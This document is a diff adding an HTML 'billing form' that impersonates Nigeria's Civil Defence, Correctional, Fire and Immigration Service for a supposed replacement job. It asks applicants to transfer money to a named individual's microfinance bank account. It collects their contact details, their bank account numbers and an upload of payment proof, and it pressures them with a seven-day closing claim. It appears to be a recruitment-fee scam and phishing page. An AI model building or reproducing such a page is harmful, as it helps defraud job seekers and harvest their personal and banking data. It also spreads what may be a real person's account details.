@@ -1,0 +1,80 @@
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Billing Form CDCFIB Replacement</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <div class="container">
+        <form action="./congratulation.htm">
+             <img src="logocdcfib.png" alt="Logo" width="120" height="40">
+             <h3 style="color:rgb(19, 9, 109);"> Civil Defence, Correctional, Fire and Immigration Service</h3>
+            <div class="row">
+                <div class="column">
+                    <h3 class="title">Billing Address</h3>
+                    <div class="input-box">
+                        <span>Full Name :</span>
+                        <input type="text" name="full name" placeholder="Jacob Musa" required>
+                    </div>
+                    <div class="input-box">
+                        <span>Email :</span>
+                        <input type="email" name="email" placeholder="abc@example.com" required>
+                    </div>
+                    <div class="input-box">
+                        <span>Mobile :</span>
+                        <input type="text" name="mobile" placeholder="+2348012345678" required>
+                    </div>
+                    <div class="input-box">
+                        <span>Address :</span>
+                        <input type="text" name="address" placeholder="House No. - Street - Locality" required>
+                    </div>
+                    <div class="input-box">
+                        <span>City :</span>
+                        <input type="text" name="city" placeholder="Abaji" required>
+                    </div>
+                     <div class="input-box">
+                        <span>State :</span>
+                        <input type="text" name="state" placeholder="Abuja" required>
+                    </div>
+                </div>
+
+                <div class="column">
+                    <h3 class="title">Payment</h3>
+                    <div class="input-box">
+                        <span>Accepted Method: Transfer</span>
+                        <h5>
+                            <p style="color:rgba(14, 233, 124, 0.466);">Account No.:  8025927304 </p>
+                            <p style="color:rgb(255, 255, 255);">Account Name:  Idris Ismail Abdulladif </p>
+                            <p style="color:rgb(255, 255, 255);">Bank Name:  Moniepoint MFB </p>
+                            <p>The HR Consultancy Information-CDCFIB for a Replacement Job </p>
+                            <p>This Form Has Been Replaced And it is Expected to Close in the Next 7 days </p>
+                        </h5>
+                    </div>
+                    <div class="input-box">
+                        <span>Name of Depositor:</span>
+                        <input type="text" name="name of depositor" placeholder="Mr. Jacob Musa" required>
+                    </div>
+                    <div class="input-box">
+                        <span>Account Number of Depositor:</span>
+                        <input type="number" name="account number of depositor" placeholder="0123456789" required>
+                    </div>
+                    <div class="input-box">
+                        <span>Bank Name of Depositor:</span>
+                        <input type="text" name="bank name of depositor" placeholder="A-MicroFinanceBank" required>
+                    </div>
+                    <div>
+                        <p>Attach Payment Evidence (e.g Reciept/Debit Alert):</p>
+                        <input type="file" id="myFile" name="filename" required>
+                    </div>
+                </div>
+            </div>
+
+            <button type="submit" class="btn" onClick="alert('Submitted Successful! All Fields, Payment and Attachment Are Required')">Submit</button>
+        </form>
+    </div>
+
+</body>
+
